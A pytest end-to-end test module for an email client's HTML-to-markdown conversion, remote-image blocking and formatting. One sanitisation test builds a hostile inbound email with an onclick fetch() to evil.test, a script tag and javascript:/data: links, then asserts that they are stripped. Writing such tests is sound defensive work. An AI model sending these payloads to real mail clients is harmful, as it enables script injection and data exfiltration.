"""tier_3: the HTML-email markdown-interchange round-trip, on the linux app.

Proves `docs/goal/behavior/html-mail.md` success-item 3 end to end through the
real stack — both directions of the "markdown is the single interchange format"
design (Slice 1, shared Rust):

  OUTBOUND  Compose **markdown** in the (now-ungated) mail compose toolbar and
            send to an external recipient. The relayed RFC 5322 bytes the stub
            external MX receives are `multipart/alternative` carrying BOTH a
            `text/plain` part (the markdown source verbatim) AND a `text/html`
            part with the markdown rendered to HTML — both `<strong>…</strong>`
            (`**bold**`) AND `<em>…</em>` (underscore `_italic_`, the form htmd and
            the macOS/windows toolbars emit). Proves `rfc5322::build_message` +
            `fauna_core::markdown::markdown_to_html`.

  INBOUND   An external peer delivers a genuine `text/html` email. It surfaces
            in the conversations list, and opening it renders the body as
            FORMATTED markdown in `dm-message-text` — no raw `<p>`/`<strong>`
            tags, no literal `**` markers. Proves
            `smtp.rs::inbound_record_to_message` →
            `html_markdown::inbound_mail_body` (HTML→markdown +
            `BodyFormat::Markdown`) and the linux `message_bubble` Markdown
            render arm.

Both halves run against ONE claimed + mail-enabled nest so the heavy claim/
enable UI dance (`helpers.mail_client_ui.claim_enable_and_ready`) is paid once —
mirroring `test_mail_client_full_roundtrip`'s send+receive-in-one-function shape.

⚠ This test deliberately uses a REAL send (outbound) and a REAL inbound SMTP
delivery (inbound), NOT the linux mock-backend inject seam: that seam
(`apps/fauna-linux/src/lib.rs` `inject_inbound_..._for_test`) hard-codes the
mail rail to `BodyFormat::PlainText`, so it cannot exercise the HTML→markdown
path at all. Only a real inbound message flows through `inbound_mail_body`.

Test taxonomy: tier_3 (every binary real, real SMTP wire in BOTH directions,
real seal → client fetch → parse → render).
"""

import time

import pytest

from helpers.budgets import UI_SETTLE_S
from helpers.mail_client_ui import claim_enable_and_ready, deliver_inbound
from helpers.waiting import wait_until

# `real_conversations`: a native app (windows, macOS/iOS) starts the REAL shared-Rust
# `ConversationsSession` receive loop only under `FAUNA_E2E_REAL_CONVERSATIONS`
# (windows `App.xaml.cs` `BuildE2eConvSessionAsync`), which conftest
# `_apply_real_conversations_env` sets only when a collected test carries this
# marker. Unmarked, windows kept its mock `ConversationsManagerHost`, so the REAL
# inbound delivery below never surfaced (`threads: []`) — while linux, which runs
# the real session for every e2e login, passed. The flag is session-wide: run this
# module in its own invocation (the sibling `test_mail_client_receive.py` shape).
pytestmark = [pytest.mark.tier_3, pytest.mark.real_conversations]

# The (external) sender/recipient domain — routed to the stub MX by the bridge's
# mta_mx_override on outbound, and (on inbound) with no loopback/local-domain
# exemption so a delivery arrives as genuine external mail.
EXTERNAL_DOMAIN = "external.test"


@pytest.mark.feature("email-in-conversations")
def test_html_mail_markdown_roundtrip(app, unclaimed_mail_nest_ui):
    """Compose markdown → sent as multipart/alternative with a rendered
    text/html part; receive a real text/html email → rendered as formatted
    markdown (not raw tags). The two halves prove the bidirectional
    markdown-interchange feature on the lead app."""

    nest = unclaimed_mail_nest_ui
    ctx = claim_enable_and_ready(app, nest, credential_kind="oauthbearer")
    domain = ctx["domain"]
    handle = ctx["handle"]

    # ── OUTBOUND: compose markdown → relayed multipart/alternative + text/html ──
    out_nonce = f"htmlout{int(time.time() * 1000)}qx"
    recipient = f"bob@{EXTERNAL_DOMAIN}"
    # The body carries the nonce (for stub-MX matching) and a markdown **bold**
    # AND an _italic_ span that must appear rendered to HTML in the text/html
    # alternative AND as the markdown source in the text/plain alternative. The
    # italic is deliberately the UNDERSCORE form — that is what the inbound
    # HTML→markdown converter (htmd) and the macOS/windows toolbars emit, and the
    # bug this guards against was the shared renderer ignoring `_…_` entirely.
    bold_token = f"bold-{out_nonce}"
    italic_token = f"italic-{out_nonce}"
    app.conversations.start_new_conversation(
        recipient,
        subject=f"HTML out {out_nonce}",
        body=f"Outbound {out_nonce} with **{bold_token}** and _{italic_token}_ body.\n",
    )

    deadline = time.monotonic() + 90.0
    relayed = None
    while time.monotonic() < deadline and relayed is None:
        for raw in nest.stub_mx.messages():
            if out_nonce.encode() in raw:
                relayed = raw
                break
        if relayed is None:
            time.sleep(0.5)

    _threads = [(t.label, t.snippet, t.rail) for t in app.conversations.list_threads()]
    assert relayed is not None, (
        f"the stub external MX never received the client-sent markdown message "
        f"{out_nonce!r}. threads={_threads}; conversations error: "
        f"{app.error_text()!r}; {nest.bridge_log_hint()}"
    )

    sent = relayed.decode("utf-8", "replace")
    # The outbound serializer builds multipart/alternative (rfc5322::build_message).
    assert "multipart/alternative" in sent, (
        f"outbound mail is not multipart/alternative — build_message did not run; "
        f"raw:\n{sent}"
    )
    assert "Content-Type: text/plain" in sent and "Content-Type: text/html" in sent, (
        f"multipart/alternative must carry both a text/plain and a text/html part; "
        f"raw:\n{sent}"
    )
    # markdown → HTML happened in the text/html part (markdown_to_html).
    assert f"<strong>{bold_token}</strong>" in sent, (
        f"the markdown **{bold_token}** was not rendered to <strong> in the "
        f"text/html alternative — markdown→HTML (markdown_to_html) did not run; "
        f"raw:\n{sent}"
    )
    # underscore italic must render too (the regression: the shared parser only
    # knew `*…*`, so `_italic_` went out as literal underscores on the wire).
    assert f"<em>{italic_token}</em>" in sent, (
        f"the markdown _{italic_token}_ was not rendered to <em> in the text/html "
        f"alternative — underscore italic emphasis was dropped by the shared "
        f"renderer (fauna_core::markdown); raw:\n{sent}"
    )
    # the markdown source survives verbatim in the text/plain part.
    assert f"**{bold_token}**" in sent, (
        f"the markdown source **{bold_token}** is missing from the text/plain "
        f"alternative; raw:\n{sent}"
    )

    # ── INBOUND: deliver a genuine text/html email → rendered FORMATTED ─────────
    in_nonce = f"htmlin{int(time.time() * 1000)}qx"
    inbound = (
        "\r\n".join([
            f"From: Carol <carol@{EXTERNAL_DOMAIN}>",
            f"To: {handle}",
            f"Subject: HTML in {in_nonce}",
            f"Message-ID: <{in_nonce}@{EXTERNAL_DOMAIN}>",
            "Date: Mon, 08 Jun 2026 12:00:00 +0000",
            "MIME-Version: 1.0",
            "Content-Type: text/html; charset=utf-8",
            "",
            f"<p>Hello <strong>{in_nonce}</strong> and <em>italic-{in_nonce}</em> world</p>",
        ]) + "\r\n"
    ).encode()
    deliver_inbound(
        nest.mx_port, domain, f"carol@{EXTERNAL_DOMAIN}", handle, inbound,
        time.monotonic() + 40.0,
    )

    # The received HTML mail surfaces decrypted in the conversations list.
    deadline = time.monotonic() + 60.0
    found = None
    while time.monotonic() < deadline and found is None:
        for t in app.conversations.list_threads():
            if in_nonce in (t.label or "") or in_nonce in (t.snippet or ""):
                found = t
                break
        if found is None:
            time.sleep(1.0)
    assert found is not None, (
        f"the inbound text/html email {in_nonce!r} never surfaced in the "
        f"conversations list — the client receive path did not complete.\n"
        f"  threads: {[(t.label, t.snippet, t.rail) for t in app.conversations.list_threads()]}\n"
        f"  conversations error: {app.error_text()!r}; {nest.bridge_log_hint()}"
    )
    assert found.rail == "Smtp", (
        f"received mail must land on the Smtp rail; got {found.rail!r}"
    )

    # Open the thread and read the rendered message bubble. The body must render
    # FORMATTED through the markdown path (inbound_mail_body stamped Markdown):
    # the `<strong>`/`<p>` tags are gone (HTML→markdown) and the `**` markdown
    # markers are stripped by the renderer (message_bubble Markdown arm). A
    # PlainText/Html stamp would instead show raw tags or literal markers.
    app.conversations.open_thread_for_sender(in_nonce)

    def _bubbles():
        return [
            app.driver.get_text("dm-message-text", index=i) or ""
            for i in range(app.driver.count("dm-message-text"))
        ]

    # Wait on the bubble carrying the nonce, not on the first read after the
    # open: web paints the thread's bubbles before their bodies settle
    # (convention 14).
    rendered = wait_until(
        lambda: next((t for t in _bubbles() if in_nonce in t), None),
        UI_SETTLE_S,
        diagnose=lambda: (
            f"the inbound message body carrying {in_nonce!r} did not render in "
            f"any dm-message-text bubble; bubbles: {_bubbles()!r}"
        ),
    )
    assert "<strong>" not in rendered and "<p>" not in rendered, (
        f"inbound HTML rendered as RAW TAGS — inbound_mail_body did not convert "
        f"HTML→markdown (or the bubble stamped Html/PlainText): {rendered!r}"
    )
    assert "**" not in rendered, (
        f"inbound body shows literal `**` markdown markers — the bubble did not "
        f"render through the Markdown arm (body_format != Markdown): {rendered!r}"
    )
    # The <em> arrived as htmd `_italic-…_`; a correct render strips the markers.
    # Literal `_italic-` means the shared renderer ignored underscore emphasis.
    assert f"italic-{in_nonce}" in rendered and f"_italic-{in_nonce}" not in rendered, (
        f"inbound <em> rendered as literal `_…_` — the shared markdown renderer "
        f"did not understand htmd's underscore italic: {rendered!r}"
    )


@pytest.mark.feature("email-in-conversations")
def test_html_mail_remote_image_blocked_until_reveal(app, unclaimed_mail_nest_ui):
    """html-mail Slice 3: an inbound HTML email with a remote ``<img>`` renders
    its image BLOCKED by default — no auto-fetch — surfacing a per-message
    ``load-remote-content-button``; clicking it reveals the image for that
    message only.

    Proves `docs/goal/behavior/html-mail.md` § Rendering + § Security & privacy
    end to end on the lead app (linux, which owns this e2e):

      - inbound ``<img src="https://…" alt="…">`` → HTML→markdown keeps it as a
        remote ``![alt](url)`` ref (`html_markdown::inbound_mail_body`), the body
        is stamped ``BodyFormat::Markdown``, and the linux ``message_bubble``
        Markdown arm renders a blocked placeholder + the reveal button (never an
        auto-fetched image — the privacy perimeter);
      - the button is visible BECAUSE the message is in the blocked state (it is
        shown only when ``count_remote_images > 0`` and not yet revealed), so its
        presence is the "blocked, not fetched" signal and its disappearance after
        the click is the "revealed" signal — both assertable without screenshots.

    Test taxonomy: tier_3 (real nest + bridge, real inbound SMTP wire, real seal
    → client fetch → HTML→markdown → render). Uses a REAL inbound delivery, not
    the linux mock inject seam (which hard-codes PlainText — see the module
    docstring), so the HTML→markdown image path actually runs.
    """

    nest = unclaimed_mail_nest_ui
    ctx = claim_enable_and_ready(app, nest, credential_kind="oauthbearer")
    domain = ctx["domain"]
    handle = ctx["handle"]

    # A genuine text/html inbound email carrying a remote image. The non-empty
    # `alt` is required: the shared parser (and `count_remote_images`, the gate)
    # treats `![](url)` with an empty alt as NOT an image, matching this client.
    in_nonce = f"htmlimg{int(time.time() * 1000)}qx"
    img_url = f"https://img.test/pixel-{in_nonce}.png"
    inbound = (
        "\r\n".join([
            f"From: Dave <dave@{EXTERNAL_DOMAIN}>",
            f"To: {handle}",
            f"Subject: HTML image {in_nonce}",
            f"Message-ID: <{in_nonce}@{EXTERNAL_DOMAIN}>",
            "Date: Mon, 08 Jun 2026 12:00:00 +0000",
            "MIME-Version: 1.0",
            "Content-Type: text/html; charset=utf-8",
            "",
            f"<p>Pixel {in_nonce} below</p>"
            f'<img src="{img_url}" alt="pixel {in_nonce}">',
        ]) + "\r\n"
    ).encode()
    deliver_inbound(
        nest.mx_port, domain, f"dave@{EXTERNAL_DOMAIN}", handle, inbound,
        time.monotonic() + 40.0,
    )

    # The received mail surfaces in the conversations list.
    deadline = time.monotonic() + 60.0
    found = None
    while time.monotonic() < deadline and found is None:
        for t in app.conversations.list_threads():
            if in_nonce in (t.label or "") or in_nonce in (t.snippet or ""):
                found = t
                break
        if found is None:
            time.sleep(1.0)
    assert found is not None, (
        f"the inbound text/html email {in_nonce!r} never surfaced in the "
        f"conversations list — the receive path did not complete.\n"
        f"  threads: {[(t.label, t.snippet, t.rail) for t in app.conversations.list_threads()]}\n"
        f"  conversations error: {app.error_text()!r}; {nest.bridge_log_hint()}"
    )

    # Open the thread. The image MUST render blocked — i.e. the per-message
    # `load-remote-content-button` is present (it shows only for not-yet-revealed
    # remote images). If the client had auto-fetched, the button would be absent.
    app.conversations.open_thread_for_sender(in_nonce)
    assert app.driver.count("dm-message-text") >= 1, (
        "no message bubble rendered in the opened inbound image thread"
    )
    deadline = time.monotonic() + 15.0
    while time.monotonic() < deadline and app.driver.count("load-remote-content-button") == 0:
        time.sleep(0.5)
    blocked_count = app.driver.count("load-remote-content-button")
    assert blocked_count >= 1, (
        f"the inbound remote image did not render BLOCKED — no "
        f"load-remote-content-button surfaced, so either the image was "
        f"auto-fetched (privacy regression) or HTML→markdown dropped the "
        f"![]() ref. button count={blocked_count}; conversations error: "
        f"{app.error_text()!r}"
    )

    # Reveal: clicking the button loads the remote content for THIS message; the
    # button then disappears (nothing left to reveal) — the blocked state clears.
    app.conversations.reveal_remote_content()
    deadline = time.monotonic() + 15.0
    while time.monotonic() < deadline and app.driver.count("load-remote-content-button") > 0:
        time.sleep(0.5)
    after_count = app.driver.count("load-remote-content-button")
    assert after_count == 0, (
        f"after clicking load-remote-content-button the blocked state did not "
        f"clear — the button is still present (count={after_count}); the reveal "
        f"did not flip the message to fetch mode"
    )


@pytest.mark.feature("email-in-conversations")
def test_html_mail_scripts_never_run_and_active_links_are_removed(
    app, unclaimed_mail_nest_ui
):
    """`docs/goal/behavior/html-mail.md` § Security & privacy — conversion is the
    perimeter: an inbound HTML mail's ``<script>`` (and its text), its event
    handlers, and the destinations of its ``javascript:`` / ``data:`` links never
    reach the bubble; the links' words stay, beside an ``https`` link's (the
    control, so a bubble that dropped everything cannot pass).

    "Never runs" is observed as "never reaches the app": the app renders only the
    markdown `html_markdown::inbound_mail_body` produced, so a script it was
    never given cannot run, and the bubble's own text shows what it was given.
    REAL inbound SMTP delivery, as the module docstring requires.
    """
    nest = unclaimed_mail_nest_ui
    ctx = claim_enable_and_ready(app, nest, credential_kind="oauthbearer")
    domain = ctx["domain"]
    handle = ctx["handle"]

    nonce = f"htmlsafe{int(time.time() * 1000)}qx"
    script_text = f"stolen{nonce}"
    inbound = (
        "\r\n".join([
            f"From: Erin <erin@{EXTERNAL_DOMAIN}>",
            f"To: {handle}",
            f"Subject: HTML scripts {nonce}",
            f"Message-ID: <{nonce}@{EXTERNAL_DOMAIN}>",
            "Date: Mon, 08 Jun 2026 12:00:00 +0000",
            "MIME-Version: 1.0",
            "Content-Type: text/html; charset=utf-8",
            "",
            f"<p onclick=\"fetch('https://evil.test/{script_text}')\">Hello {nonce}</p>"
            f"<script>document.title='{script_text}';</script>"
            f"<p><a href=\"javascript:alert('{script_text}')\">click jsword</a> "
            f"<a href=\"data:text/html;base64,PHNjcmlwdD4=\">open dataword</a> "
            f"<a href=\"https://safe.test/{nonce}\">safeword</a></p>",
        ]) + "\r\n"
    ).encode()
    deliver_inbound(
        nest.mx_port, domain, f"erin@{EXTERNAL_DOMAIN}", handle, inbound,
        time.monotonic() + 40.0,
    )

    wait_until(
        lambda: any(
            nonce in (t.label or "") or nonce in (t.snippet or "")
            for t in app.conversations.list_threads()
        ),
        60.0,
        diagnose=lambda: f"the inbound text/html email {nonce!r} never surfaced; "
        f"threads: {[(t.label, t.snippet) for t in app.conversations.list_threads()]}; "
        f"error: {app.error_text()!r}; {nest.bridge_log_hint()}",
    )
    app.conversations.open_thread_for_sender(nonce)
    body = wait_until(
        lambda: next(
            (t for t in app.driver.get_texts("dm-message-text") if f"Hello {nonce}" in t),
            None,
        ),
        UI_SETTLE_S,
        diagnose=lambda: f"no bubble carries the mail's text; bubbles: "
        f"{app.driver.get_texts('dm-message-text')!r}; error: {app.error_text()!r}",
    )
    for word in ("jsword", "dataword", "safeword"):
        assert word in body, f"a link's words stay in the bubble ({word!r}): {body!r}"
    for banned in (script_text, "javascript:", "data:text/html", "onclick", "<script"):
        assert banned not in body, (
            f"{banned!r} reached the bubble — the HTML→markdown perimeter let "
            f"active content through: {body!r}"
        )


def _assert_rendered_structure(app, index: int, nonce: str, what: str) -> None:
    """The bubble at ``index`` renders the formatted body — the quote, the
    numbered list and the bold-italic span — with ``keep_snake_case_<nonce>``
    literal.

    Every app answers the one-line plaintext (``get_text``): no raw tag, no
    markdown marker, no escape backslash, the code-like name intact. An app with
    the painted read (tui, web — `helpers/painted_lines.py`) also answers the
    body AS PAINTED (``message_painted_lines``), which is what
    shows the structure a plaintext folds away: the quote's ``│`` bar and the
    list's ``1.``/``2.`` numbering. The painted read has no style channel, so
    bold-italic is witnessed by its ``***`` markers being consumed as emphasis
    rather than painted as text — the same observable the bold/italic witness
    above uses."""
    text = app.driver.get_text("dm-message-text", index=index) or ""
    for word in (f"quoted-{nonce}", f"first-{nonce}", f"second-{nonce}", f"both-{nonce}"):
        assert word in text, f"{what}: {word!r} is missing from the bubble: {text!r}"
    for raw in ("<", ">", "*", "\\"):
        assert raw not in text, (
            f"{what}: {raw!r} reached the bubble — a tag, a quote marker, an "
            f"emphasis marker or an escape was painted as text: {text!r}"
        )
    snake = f"keep_snake_case_{nonce}"
    assert snake in text, (
        f"{what}: {snake!r} must stay literal (CommonMark's intraword guard), "
        f"not lose its underscores to italics: {text!r}"
    )

    from helpers.painted_lines import painted_read_built

    if not painted_read_built(app.driver):
        return  # the plaintext half above is this app's whole witness for now
    lines = app.conversations.message_painted_lines(index)
    stripped = [line.strip() for line in lines]
    assert f"│ quoted-{nonce}" in stripped, (
        f"{what}: the quote must paint behind its bar: {lines!r}"
    )
    first = stripped.index(f"1. first-{nonce}") if f"1. first-{nonce}" in stripped else -1
    assert first >= 0 and stripped[first + 1:first + 2] == [f"2. second-{nonce}"], (
        f"{what}: the list must paint numbered 1., 2. on consecutive lines: {lines!r}"
    )
    assert any(f"both-{nonce} and {snake}" in line for line in stripped), (
        f"{what}: the bold-italic span and the literal name paint as one line of "
        f"words, markers consumed: {lines!r}"
    )


def _bubble_index(app, word: str) -> tuple[int] | None:
    """``(index,)`` of the first bubble carrying ``word`` — a tuple, so bubble 0
    is truthy for ``wait_until`` — or ``None``."""
    for i, text in enumerate(app.driver.get_texts("dm-message-text")):
        if word in (text or ""):
            return (i,)
    return None


@pytest.mark.feature("email-in-conversations")
def test_html_mail_keeps_quotes_lists_and_bold_italic_and_the_sent_copy_renders_formatted(
    app, unclaimed_mail_nest_ui
):
    """Outcome 22 (`docs/goal/behavior/html-mail.md` § Rendering, and the
    shared parser's `> ` blockquote, `N.` ordered list and `***bold-italic***`
    the same section records): a received HTML mail keeps its quote, its
    numbered list and its bold-italic; the user's own Sent copy of a markdown
    message renders formatted too, never as its raw source; and a name written
    like code (`keep_snake_case_…`) stays literal in both.

    The received half is a REAL inbound `text/html` delivery (the module
    docstring says why not the inject seam); the Sent half is a real send from
    the app, and its relayed `text/html` alternative is read too, so the copy
    the user sees and the mail that left agree."""

    nest = unclaimed_mail_nest_ui
    ctx = claim_enable_and_ready(app, nest, credential_kind="oauthbearer")
    domain = ctx["domain"]
    handle = ctx["handle"]

    # ── RECEIVED: quote, numbered list, bold-italic, a code-like name ──────────
    rin = f"htmlrich{int(time.time() * 1000)}qx"
    inbound = (
        "\r\n".join([
            f"From: Frank <frank@{EXTERNAL_DOMAIN}>",
            f"To: {handle}",
            f"Subject: HTML rich {rin}",
            f"Message-ID: <{rin}@{EXTERNAL_DOMAIN}>",
            "Date: Mon, 08 Jun 2026 12:00:00 +0000",
            "MIME-Version: 1.0",
            "Content-Type: text/html; charset=utf-8",
            "",
            f"<blockquote><p>quoted-{rin}</p></blockquote>"
            f"<ol><li>first-{rin}</li><li>second-{rin}</li></ol>"
            f"<p><strong><em>both-{rin}</em></strong> and keep_snake_case_{rin}</p>",
        ]) + "\r\n"
    ).encode()
    deliver_inbound(
        nest.mx_port, domain, f"frank@{EXTERNAL_DOMAIN}", handle, inbound,
        time.monotonic() + 40.0,
    )
    wait_until(
        lambda: any(
            rin in (t.label or "") or rin in (t.snippet or "")
            for t in app.conversations.list_threads()
        ),
        60.0,
        diagnose=lambda: f"the inbound text/html email {rin!r} never surfaced; "
        f"threads: {[(t.label, t.snippet) for t in app.conversations.list_threads()]}; "
        f"error: {app.error_text()!r}; {nest.bridge_log_hint()}",
    )
    app.conversations.open_thread_for_sender(rin)
    index = wait_until(
        lambda: _bubble_index(app, f"first-{rin}"),
        UI_SETTLE_S,
        diagnose=lambda: f"no bubble carries the received mail's text; bubbles: "
        f"{app.driver.get_texts('dm-message-text')!r}; error: {app.error_text()!r}",
    )[0]
    _assert_rendered_structure(app, index, rin, "the received HTML mail")

    # ── SENT: the same shapes, written as markdown in the app ──────────────────
    out = f"htmlsent{int(time.time() * 1000)}qx"
    body = (
        f"> quoted-{out}\n\n"
        f"1. first-{out}\n2. second-{out}\n\n"
        f"***both-{out}*** and keep_snake_case_{out}\n"
    )
    app.conversations.start_new_conversation(
        f"grace@{EXTERNAL_DOMAIN}", subject=f"HTML sent {out}", body=body,
        body_via_fill=True,
    )
    relayed = wait_until(
        lambda: next((raw for raw in nest.stub_mx.messages() if out.encode() in raw), None),
        90.0,
        diagnose=lambda: f"the stub external MX never received {out!r}; "
        f"error: {app.error_text()!r}; {nest.bridge_log_hint()}",
    ).decode("utf-8", "replace")
    for tag in ("<blockquote>", "<ol>"):
        assert tag in relayed, f"the relayed text/html alternative lacks {tag}: {relayed}"
    assert "<em>snake" not in relayed and f"keep_snake_case_{out}" in relayed, (
        f"the code-like name must leave literal, not italicized: {relayed}"
    )

    # The user's own copy, in the thread the send opened.
    app.conversations.navigate()
    app.conversations.open_thread_for_sender(out)
    index = wait_until(
        lambda: _bubble_index(app, f"first-{out}"),
        UI_SETTLE_S,
        diagnose=lambda: f"no bubble carries the sent copy's text; bubbles: "
        f"{app.driver.get_texts('dm-message-text')!r}; error: {app.error_text()!r}",
    )[0]
    _assert_rendered_structure(app, index, out, "your own Sent copy")
